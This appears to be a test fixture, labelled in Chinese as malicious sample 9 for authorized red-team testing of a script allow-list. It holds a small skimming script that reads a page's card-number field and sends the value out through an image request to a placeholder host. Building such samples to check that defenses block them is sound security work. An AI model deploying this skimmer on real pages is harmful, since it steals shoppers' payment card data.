/**
 * ⚠️ 恶意样本 9（授权红队测试用）：未授权脚本注入
 *
 * 不在供应商允许名单里的未知脚本，运行即试图读卡号并外发。
 * 预期：script 加载入口直接被拦（unauthorized-script），代码不执行。
 */
(function () {
  const card = document.querySelector('#card-number');
  const value = card ? card.value : 'no-field';
  new Image().src = `https://unknown-tracker.example/p?d=${encodeURIComponent(value)}`;
})();
